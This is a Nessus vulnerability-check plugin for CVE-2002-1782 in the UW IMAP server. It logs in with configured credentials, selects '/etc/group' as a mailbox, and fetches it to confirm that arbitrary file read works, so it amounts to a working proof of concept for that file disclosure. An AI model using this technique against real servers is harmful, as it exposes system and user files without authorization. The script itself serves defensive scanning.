#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, output formatting (9/5/09)
# - family change (9/6/09)


include("compat.inc");

if (description) {
  script_id(12254);
  script_version("$Revision: 1.21 $");
  script_cve_id("CVE-2002-1782");
  script_bugtraq_id(4909);
  script_osvdb_id(57681);

  script_name(english:"UoW imap Server (uw-imapd) Arbitrary Remote File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The target is running an IMAP daemon that allows an authenticated user
to retrieve and manipulate files that would be available to that user
via a shell.  If IMAP users are denied shell access, you may consider
this a vulnerability." );
 script_set_attribute(attribute:"see_also", value:"http://www.washington.edu/imap/IMAP-FAQs/index.html#5.1" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jun/2" );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a fix." );
 script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/05/26");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for IMAP arbitrary file retrieval vulnerability");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2016 George A. Theall");
  script_family(english:"Misc.");
  script_dependencie("find_service1.nasl", "global_settings.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

file = "/etc/group";                    # file to grab from target.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  exit(1, "imap/login and/or imap/password are empty");
}

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);

# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);

# Try to log in.
#
# - try the PLAIN SASL mechanism.
#   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
#       it may also require SSL / TLS encapsulation.
++tag;
c = string("a", string(tag), ' AUTHENTICATE "PLAIN"');
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);
if (s =~ "^\+") {
  c = base64(str:raw_string(0, user, 0, pass));
  send(socket:soc, data:string(c, "\r\n"));
  # nb: I'm not sure why, but the following recv_line often times out
  #     unless I either sleep for a bit before or specify a timeout
  #     even though the actual delay / timeout seems irrelevant.
  while (s = recv_line(socket:soc, length:1024, timeout:1)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }
}

# If that didn't work, try LOGIN command.
if (isnull(resp)) {
  ++tag;
  c = string("a", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }
}

# If successful, try to select an arbitrary file to use as a mailbox.
if (resp && resp =~ "OK") {
  ++tag;
  c = string("a", string(tag), ' SELECT "', file, '"');
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }

  # If successful, try to read the file.
  #
  # NB: this isn't really necessary since the previous command,
  #     if successful, means we can read the file.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " FETCH 1 rfc822");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }
    if (resp && resp =~ "OK") security_note(port);
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
